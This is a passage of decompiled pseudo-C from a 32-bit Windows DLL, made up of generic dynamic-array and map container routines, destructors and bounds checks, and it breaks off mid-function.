//----- (1001F730) --------------------------------------------------------
int __thiscall sub_1001F730(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 40))(*(_DWORD *)(this + 4), v2);
}

//----- (1001F76B) --------------------------------------------------------
int __thiscall sub_1001F76B(int this, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 8);
  *(_DWORD *)(this + 8) = v2 + 1;
  return (*(int (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 4) + 32))(*(_DWORD *)(this + 4), a2, v2);
}

//----- (1001F787) --------------------------------------------------------
_DWORD *__thiscall sub_1001F787(_DWORD *Block, char a2)
{
  sub_1001F843(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001F7A7) --------------------------------------------------------
_DWORD *__thiscall sub_1001F7A7(_DWORD *Block, char a2)
{
  *Block = off_1009420C;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 1009420C: using guessed type int (__thiscall *off_1009420C[2])(void *Block, char);

//----- (1001F7C7) --------------------------------------------------------
_DWORD *__thiscall sub_1001F7C7(_DWORD *Block, char a2)
{
  sub_1001F213(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001F7E6) --------------------------------------------------------
_DWORD *__thiscall sub_1001F7E6(_DWORD *Block, char a2)
{
  sub_1001F37D(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001F805) --------------------------------------------------------
_DWORD *__thiscall sub_1001F805(_DWORD *Block, char a2)
{
  sub_1001F4E7(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001F824) --------------------------------------------------------
_DWORD *__thiscall sub_1001F824(_DWORD *Block, char a2)
{
  sub_1001F651(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001F843) --------------------------------------------------------
_DWORD *__stdcall sub_1001F843(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  a1[2] = off_1009420C;
  *a1 = &off_10094210;
  return result;
}
// 1009420C: using guessed type int (__thiscall *off_1009420C[2])(void *Block, char);
// 10094210: using guessed type int (__thiscall *off_10094210)(void *Block, char);

//----- (1001F8CC) --------------------------------------------------------
void **__thiscall sub_1001F8CC(void **this, void **a2)
{
  void (__thiscall **v3)(void **, int); // ebx
  int v4; // eax
  int v5; // eax

  if ( a2 != this )
  {
    j__free(this[3]);
    v3 = (void (__thiscall **)(void **, int))*this;
    this[2] = (void *)1;
    v4 = (*((int (__thiscall **)(void **))*a2 + 1))(a2);
    v5 = (*((int (__thiscall **)(void **, void *, int))*a2 + 1))(a2, a2[3], v4);
    v3[21](this, v5);
  }
  return this;
}

//----- (1001F90E) --------------------------------------------------------
void __thiscall sub_1001F90E(int this)
{
  *(_DWORD *)this = &off_10094270;
  j__free(*(void **)(this + 12));
  *(_DWORD *)(this + 12) = 0;
  sub_1001E7BB((_DWORD *)this);
}
// 10094270: using guessed type int (__thiscall *off_10094270)(void *Block, char);

//----- (1001F95D) --------------------------------------------------------
int __thiscall sub_1001F95D(_DWORD *this)
{
  return this[1];
}

//----- (1001F961) --------------------------------------------------------
int __thiscall sub_1001F961(_DWORD *this, _DWORD *a2, unsigned int a3)
{
  int v4; // edi
  int v5; // eax
  unsigned int i; // eax
  int result; // eax

  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_100B6C16);
  v4 = *this;
  v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(_DWORD *, int))(v4 + 60))(this, v5 + 1);
  for ( i = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); i > a3; --i )
    *(_DWORD *)(this[3] + 4 * i) = *(_DWORD *)(this[3] + 4 * i - 4);
  result = this[3];
  *(_DWORD *)(result + 4 * a3) = *a2;
  ++this[1];
  return result;
}

//----- (1001F9BE) --------------------------------------------------------
int __thiscall sub_1001F9BE(int *this, int a2)
{
  int v3; // esi
  int v4; // eax

  v3 = *this;
  v4 = (*(int (__thiscall **)(int *))(*this + 4))(this);
  return (*(int (__thiscall **)(int *, int, int))(v3 + 32))(this, a2, v4);
}

//----- (1001F9D9) --------------------------------------------------------
int __thiscall sub_1001F9D9(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // edi

  v2 = a2;
  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_100B6C17);
  --this[1];
  while ( v2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    *(_DWORD *)(this[3] + 4 * v2) = *(_DWORD *)(this[3] + 4 * v2 + 4);
    ++v2;
  }
  *(_DWORD *)(this[3] + 4 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)) = 0;
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}

//----- (1001FA25) --------------------------------------------------------
int __thiscall sub_1001FA25(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_100B6C21);
  return this[3] + 4 * a2;
}

//----- (1001FA46) --------------------------------------------------------
int __thiscall sub_1001FA46(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_100B6C22);
  return this[3] + 4 * a2;
}

//----- (1001FA67) --------------------------------------------------------
void __thiscall sub_1001FA67(_DWORD *this, unsigned int a2)
{
  void *v2; // esi

  if ( this[2] < a2 )
  {
    v2 = (void *)this[3];
    (*(void (__thiscall **)(_DWORD *, _DWORD, void *, unsigned int))(*this + 84))(this, this[1], v2, a2);
    j__free(v2);
  }
}

//----- (1001FA8C) --------------------------------------------------------
int __thiscall sub_1001FA8C(void **this)
{
  void *v2; // edx
  int result; // eax

  j__free(this[3]);
  v2 = *this;
  this[2] = (void *)1;
  result = (*((int (__thiscall **)(void **, _DWORD, _DWORD, int))v2 + 21))(this, 0, 0, 1);
  this[1] = 0;
  return result;
}

//----- (1001FAB0) --------------------------------------------------------
BOOL __thiscall sub_1001FAB0(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this) == 0;
}

//----- (1001FABB) --------------------------------------------------------
int __thiscall sub_1001FABB(_DWORD *this, unsigned int a2)
{
  unsigned int i; // edi
  int v4; // eax

  for ( i = a2; i < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); ++i )
    *(_DWORD *)(this[3] + 4 * i) = 0;
  (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 60))(this, a2);
  v4 = *this;
  this[1] = a2;
  return (*(int (__thiscall **)(_DWORD *))(v4 + 88))(this);
}

//----- (1001FAFD) --------------------------------------------------------
unsigned int __thiscall sub_1001FAFD(_DWORD *this, unsigned int a2, int a3, int a4)
{
  unsigned int v5; // edi
  unsigned int result; // eax

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_100B6C23);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 60))(a4, this[1] - a2);
  v5 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      if ( v5 >= a2 )
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 36))(a4, this[3] + 4 * v5);
      else
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 36))(a3, this[3] + 4 * v5);
      ++v5;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v5 < result );
  }
  return result;
}

//----- (1001FB6F) --------------------------------------------------------
unsigned int __thiscall sub_1001FB6F(void *this, unsigned int pExceptionObject, int a3)
{
  unsigned int result; // eax

  result = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject >= result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return result;
}

//----- (1001FB97) --------------------------------------------------------
unsigned int __stdcall sub_1001FB97(unsigned int a1, unsigned int a2)
{
  unsigned int result; // eax

  for ( result = a1; result < a2; result *= 2 )
    ;
  return result;
}

//----- (1001FBAA) --------------------------------------------------------
unsigned int __thiscall sub_1001FBAA(_DWORD *this, int a2, int a3, int a4)
{
  int v5; // eax
  unsigned int v6; // edi
  unsigned int result; // eax

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, int))(*this + 80))(this, this[2], a4);
  this[2] = v5;
  this[3] = operator new(4 * v5);
  this[1] = a2;
  v6 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      *(_DWORD *)(this[3] + 4 * v6) = *(_DWORD *)(a3 + 4 * v6);
      ++v6;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v6 < result );
  }
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1001FC08) --------------------------------------------------------
void __thiscall sub_1001FC08(_DWORD *this)
{
  int v2; // edi
  int v3; // eax
  int v4; // edi
  int v5; // eax
  void *v6; // ebx
  _DWORD *v7; // edi
  int v8; // ebx
  void *Block; // [esp+8h] [ebp-10h]
  _DWORD *v10; // [esp+Ch] [ebp-Ch]
  int v11; // [esp+10h] [ebp-8h]
  unsigned int v12; // [esp+14h] [ebp-4h]

  if ( this[2] > 0x10u && (unsigned int)(2 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)) <= this[2] )
  {
    v2 = *this;
    v3 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    if ( (unsigned int)(*(int (__thiscall **)(_DWORD *, int, int))(v2 + 80))(this, 1, v3) <= 0x10 )
    {
      v11 = 16;
    }
    else
    {
      v4 = *this;
      v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
      v11 = (*(int (__thiscall **)(_DWORD *, int, int))(v4 + 80))(this, 1, v5);
    }
    v6 = (void *)this[3];
    Block = v6;
    v12 = 0;
    v7 = operator new(4 * v11);
    v10 = v7;
    if ( (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    {
      v8 = (_BYTE *)v6 - (_BYTE *)v7;
      do
      {
        ++v12;
        *v7 = *(_DWORD *)((char *)v7 + v8);
        ++v7;
      }
      while ( v12 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) );
    }
    this[3] = v10;
    j__free(Block);
    this[2] = v11;
  }
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1001FCBE) --------------------------------------------------------
void **__thiscall sub_1001FCBE(void **this, void **a2)
{
  void (__thiscall **v3)(void **, int); // ebx
  int v4; // eax
  int v5; // eax

  if ( a2 != this )
  {
    j__free(this[3]);
    v3 = (void (__thiscall **)(void **, int))*this;
    this[2] = (void *)1;
    v4 = (*((int (__thiscall **)(void **))*a2 + 1))(a2);
    v5 = (*((int (__thiscall **)(void **, void *, int))*a2 + 1))(a2, a2[3], v4);
    v3[21](this, v5);
  }
  return this;
}

//----- (1001FD00) --------------------------------------------------------
void __thiscall sub_1001FD00(int this)
{
  *(_DWORD *)this = &off_10094308;
  j__free(*(void **)(this + 12));
  *(_DWORD *)(this + 12) = 0;
  sub_1001EC61((_DWORD *)this);
}
// 10094308: using guessed type int (__thiscall *off_10094308)(void *Block, char);

//----- (1001FD4F) --------------------------------------------------------
int __thiscall sub_1001FD4F(_DWORD *this)
{
  return this[1];
}

//----- (1001FD53) --------------------------------------------------------
int __thiscall sub_1001FD53(_DWORD *this, _BYTE *a2, unsigned int a3)
{
  int v4; // edi
  int v5; // eax
  unsigned int i; // eax
  int result; // eax

  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_100B6C39);
  v4 = *this;
  v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(_DWORD *, int))(v4 + 60))(this, v5 + 1);
  for ( i = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); i > a3; --i )
    *(_BYTE *)(i + this[3]) = *(_BYTE *)(i + this[3] - 1);
  result = this[3];
  *(_BYTE *)(a3 + result) = *a2;
  ++this[1];
  return result;
}

//----- (1001FDAF) --------------------------------------------------------
int __thiscall sub_1001FDAF(int *this, int a2)
{
  int v3; // esi
  int v4; // eax

  v3 = *this;
  v4 = (*(int (__thiscall **)(int *))(*this + 4))(this);
  return (*(int (__thiscall **)(int *, int, int))(v3 + 32))(this, a2, v4);
}

//----- (1001FDCA) --------------------------------------------------------
int __thiscall sub_1001FDCA(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // edi

  v2 = a2;
  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_100B6C3A);
  --this[1];
  while ( v2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    *(_BYTE *)(v2 + this[3]) = *(_BYTE *)(v2 + this[3] + 1);
    ++v2;
  }
  *(_BYTE *)((*(int (__thiscall **)(_DWORD *))(*this + 4))(this) + this[3]) = 0;
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}

//----- (1001FE15) --------------------------------------------------------
int __thiscall sub_1001FE15(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_100B6C3B);
  return a2 + this[3];
}

//----- (1001FE33) --------------------------------------------------------
int __thiscall sub_1001FE33(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_100B6C42);
  return a2 + this[3];
}

//----- (1001FE51) --------------------------------------------------------
void __thiscall sub_1001FE51(_DWORD *this, unsigned int a2)
{
  void *v2; // esi

  if ( this[2] < a2 )
  {
    v2 = (void *)this[3];
    (*(void (__thiscall **)(_DWORD *, _DWORD, void *, unsigned int))(*this + 84))(this, this[1], v2, a2);
    j__free(v2);
  }
}

//----- (1001FE76) --------------------------------------------------------
int __thiscall sub_1001FE76(void **this)
{
  void *v2; // edx
  int result; // eax

  j__free(this[3]);
  v2 = *this;
  this[2] = (void *)1;
  result = (*((int (__thiscall **)(void **, _DWORD, _DWORD, int))v2 + 21))(this, 0, 0, 1);
  this[1] = 0;
  return result;
}

//----- (1001FE9A) --------------------------------------------------------
BOOL __thiscall sub_1001FE9A(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this) == 0;
}

//----- (1001FEA5) --------------------------------------------------------
int __thiscall sub_1001FEA5(_DWORD *this, unsigned int a2)
{
  unsigned int i; // edi
  int v4; // eax

  for ( i = a2; i < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); ++i )
    *(_BYTE *)(i + this[3]) = 0;
  (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 60))(this, a2);
  v4 = *this;
  this[1] = a2;
  return (*(int (__thiscall **)(_DWORD *))(v4 + 88))(this);
}

//----- (1001FEE7) --------------------------------------------------------
unsigned int __thiscall sub_1001FEE7(_DWORD *this, unsigned int a2, int *a3, int *a4)
{
  unsigned int result; // eax
  int v7; // edx
  int *v8; // ecx
  unsigned int v9; // [esp+18h] [ebp+Ch]

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_100B6C43);
  (*(void (__thiscall **)(int *, unsigned int))(*a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int *, unsigned int))(*a4 + 60))(a4, this[1] - a2);
  v9 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      if ( v9 >= a2 )
      {
        v7 = *a4;
        v8 = a4;
      }
      else
      {
        v7 = *a3;
        v8 = a3;
      }
      (*(void (__thiscall **)(int *, unsigned int))(v7 + 36))(v8, v9 + this[3]);
      ++v9;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v9 < result );
  }
  return result;
}

//----- (1001FF5A) --------------------------------------------------------
unsigned int __thiscall sub_1001FF5A(void *this, unsigned int pExceptionObject, int a3)
{
  unsigned int result; // eax

  result = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject >= result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return result;
}

//----- (1001FF82) --------------------------------------------------------
unsigned int __stdcall sub_1001FF82(unsigned int a1, unsigned int a2)
{
  unsigned int result; // eax

  for ( result = a1; result < a2; result *= 2 )
    ;
  return result;
}

//----- (1001FF95) --------------------------------------------------------
unsigned int __thiscall sub_1001FF95(_DWORD *this, int a2, int a3, int a4)
{
  size_t v5; // eax
  unsigned int v6; // edi
  unsigned int result; // eax

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, int))(*this + 80))(this, this[2], a4);
  this[2] = v5;
  this[3] = operator new(v5);
  this[1] = a2;
  v6 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      *(_BYTE *)(v6 + this[3]) = *(_BYTE *)(v6 + a3);
      ++v6;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v6 < result );
  }
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1001FFE5) --------------------------------------------------------
void __thiscall sub_1001FFE5(_DWORD *this)
{
  int v2; // edi
  int v3; // eax
  int v4; // edi
  int v5; // eax
  _BYTE *v6; // ebx
  int v7; // eax
  _BYTE *v8; // edi
  _BYTE *Block; // [esp+Ch] [ebp-Ch]
  size_t v10; // [esp+10h] [ebp-8h]
  unsigned int v11; // [esp+14h] [ebp-4h]

  if ( this[2] > 0x10u && (unsigned int)(2 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)) <= this[2] )
  {
    v2 = *this;
    v3 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    if ( (unsigned int)(*(int (__thiscall **)(_DWORD *, int, int))(v2 + 80))(this, 1, v3) <= 0x10 )
    {
      v10 = 16;
    }
    else
    {
      v4 = *this;
      v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
      v10 = (*(int (__thiscall **)(_DWORD *, int, int))(v4 + 80))(this, 1, v5);
    }
    Block = (_BYTE *)this[3];
    v11 = 0;
    v6 = operator new(v10);
    if ( (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    {
      v7 = Block - v6;
      v8 = v6;
      while ( 1 )
      {
        ++v11;
        *v8 = v8[v7];
        ++v8;
        if ( v11 >= (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
          break;
        v7 = Block - v6;
      }
    }
    this[3] = v6;
    j__free(Block);
    this[2] = v10;
  }
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10020091) --------------------------------------------------------
void __thiscall sub_10020091(_DWORD *this)
{
  *this = &off_100942CC;
  sub_1001FD00((int)(this + 5));
  sub_1001F90E((int)(this + 1));
  sub_1001E47D(this);
}
// 100942CC: using guessed type int (__thiscall *off_100942CC)(void *Block, char);

//----- (100200DC) --------------------------------------------------------
bool __thiscall sub_100200DC(_DWORD *this, _DWORD *a2)
{
  int v3; // edi

  v3 = sub_10020795(this, a2);
  return v3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
      && *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 48))(this + 1, v3) == *a2;
}

//----- (10020116) --------------------------------------------------------
char __thiscall sub_10020116(_DWORD *this, _DWORD *a2)
{
  int v3; // edi

  v3 = sub_10020795(this, a2);
  if ( v3 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 44))(this + 1, v3) != *a2 )
  {
    return 0;
  }
  (*(void (__thiscall **)(_DWORD *, int))(this[1] + 40))(this + 1, v3);
  (*(void (__thiscall **)(_DWORD *, int))(this[5] + 40))(this + 5, v3);
  return 1;
}

//----- (10020165) --------------------------------------------------------
int __thiscall sub_10020165(_DWORD *this, _DWORD *a2)
{
  _DWORD *v2; // edi
  int v4; // esi
  int v5; // eax

  v2 = a2;
  v4 = sub_10020795(this, a2);
  if ( v4 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 44))(this + 1, v4) != *v2 )
  {
    (*(void (__thiscall **)(_DWORD *, _DWORD *, int))(this[1] + 32))(this + 1, v2, v4);
    v5 = this[5];
    HIBYTE(a2) = 0;
    (*(void (__thiscall **)(_DWORD *, char *, int))(v5 + 32))(this + 5, (char *)&a2 + 3, v4);
  }
  return (*(int (__thiscall **)(_DWORD *, int))(this[5] + 44))(this + 5, v4);
}

//----- (100201BD) --------------------------------------------------------
int __thiscall sub_100201BD(_DWORD *this, _DWORD *pExceptionObject)
{
  _DWORD *v2; // esi
  int v4; // edi

  v2 = pExceptionObject;
  v4 = sub_10020795(this, pExceptionObject);
  if ( v4 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 48))(this + 1, v4) != *v2 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD *, int))(this[5] + 48))(this + 5, v4);
}

//----- (10020212) --------------------------------------------------------
_DWORD *__thiscall sub_10020212(_DWORD *this, _DWORD *a2)
{
  sub_100206B6(this + 1, a2);
  return a2;
}

//----- (10020243) --------------------------------------------------------
_DWORD *__thiscall sub_10020243(_DWORD *this, _DWORD *a2)
{
  sub_10020704(this + 5, a2);
  return a2;
}

//----- (10020274) --------------------------------------------------------
int __thiscall sub_10020274(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int))(this[1] + 60))(this + 1, a2);
  return (*(int (__thiscall **)(_DWORD *))(this[5] + 60))(this + 5);
}

//----- (1002028F) --------------------------------------------------------
int __thiscall sub_1002028F(_DWORD *this)
{
  (*(void (__thiscall **)(_DWORD *))(this[1] + 52))(this + 1);
  return (*(int (__thiscall **)(_DWORD *))(this[5] + 52))(this + 5);
}

//----- (100202A3) --------------------------------------------------------
int __thiscall sub_100202A3(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[1] + 64))(this + 1);
}

//----- (100202AB) --------------------------------------------------------
_DWORD *__stdcall sub_100202AB(_DWORD *a1)
{
  *a1 = &off_100941BC;
  sub_10020752(a1 + 1);
  return a1;
}
// 100941BC: using guessed type int (__thiscall *off_100941BC)(void *Block, char);

//----- (100202D7) --------------------------------------------------------
void __thiscall sub_100202D7(_DWORD *this)
{
  *this = &off_100941BC;
  sub_10020091(this + 1);
}
// 100941BC: using guessed type int (__thiscall *off_100941BC)(void *Block, char);

//----- (100202FE) --------------------------------------------------------
int __thiscall sub_100202FE(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[1] + 8))(this + 1);
}

//----- (1002030A) --------------------------------------------------------
BOOL __thiscall sub_1002030A(_DWORD *this, int a2)
{
  char v3; // bl

  v3 = (*(int (__thiscall **)(_DWORD *, int))(*this + 4))(this, a2);
  *(_BYTE *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 16))(this + 1, a2) = 1;
  return v3 == 0;
}

//----- (10020336) --------------------------------------------------------
int __thiscall sub_10020336(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[1] + 12))(this + 1);
}

//----- (10020342) --------------------------------------------------------
int __thiscall sub_10020342(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int))(this[1] + 44))(this + 1, a2);
  return a2;
}

//----- (10020373) --------------------------------------------------------
int __thiscall sub_10020373(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int))(this[1] + 32))(this + 1, a2);
  return a2;
}

//----- (100203A4) --------------------------------------------------------
int __thiscall sub_100203A4(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[1] + 52))(this + 1);
}

//----- (100203B0) --------------------------------------------------------
int __thiscall sub_100203B0(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[1] + 24))(this + 1);
}

//----- (100203B8) --------------------------------------------------------
int __thiscall sub_100203B8(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[1] + 28))(this + 1);
}

//----- (100203D4) --------------------------------------------------------
_DWORD *__userpurge sub_100203D4@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10020413) --------------------------------------------------------
void __thiscall sub_10020413(void *this)
{
  sub_10020828((int)this);
}

//----- (10020458) --------------------------------------------------------
_DWORD *__userpurge sub_10020458@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10020497) --------------------------------------------------------
void __thiscall sub_10020497(void *this)
{
  sub_10020862((int)this);
}

//----- (100204C8) --------------------------------------------------------
_DWORD *__userpurge sub_100204C8@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10020507) --------------------------------------------------------
void __thiscall sub_10020507(void *this)
{
  sub_1002088A((int)this);
}

//----- (10020546) --------------------------------------------------------
_DWORD *__userpurge sub_10020546@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10020585) --------------------------------------------------------
void __thiscall sub_10020585(void *this)
{
  sub_100208C4((int)this);
}

//----- (100205CA) --------------------------------------------------------
_DWORD *__userpurge sub_100205CA@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10020609) --------------------------------------------------------
void __thiscall sub_10020609(void *this)
{
  sub_100208FE((int)this);
}

//----- (1002063A) --------------------------------------------------------
void *__thiscall sub_1002063A(void *Block, char a2)
{
  sub_1001F90E((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10020659) --------------------------------------------------------
void *__thiscall sub_10020659(void *Block, char a2)
{
  sub_1001FD00((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10020678) --------------------------------------------------------
_DWORD *__thiscall sub_10020678(_DWORD *Block, char a2)
{
  sub_10020091(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10020697) --------------------------------------------------------
_DWORD *__thiscall sub_10020697(_DWORD *Block, char a2)
{
  sub_100202D7(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100206B6) --------------------------------------------------------
_DWORD *__userpurge sub_100206B6@<eax>(_DWORD *a1@<esi>, _DWORD *a2)
{
  int v2; // eax
  int v4; // [esp-8h] [ebp-24h]
  int v5; // [esp-4h] [ebp-20h]

  sub_10020951(a2);
  *a2 = &off_10094270;
  a2[2] = 1;
  v5 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  v4 = a1[3];
  v2 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  sub_1001FBAA(a2, v2, v4, v5);
  return a2;
}
// 10094270: using guessed type int (__thiscall *off_10094270)(void *Block, char);

//----- (10020704) --------------------------------------------------------
_DWORD *__userpurge sub_10020704@<eax>(_DWORD *a1@<esi>, _DWORD *a2)
{
  int v2; // eax
  int v4; // [esp-8h] [ebp-24h]
  int v5; // [esp-4h] [ebp-20h]

  sub_1002097C(a2);
  *a2 = &off_10094308;
  a2[2] = 1;
  v5 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  v4 = a1[3];
  v2 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  sub_1001FF95(a2, v2, v4, v5);
  return a2;
}
// 10094308: using guessed type int (__thiscall *off_10094308)(void *Block, char);

//----- (10020752) --------------------------------------------------------
_DWORD *__stdcall sub_10020752(_DWORD *a1)
{
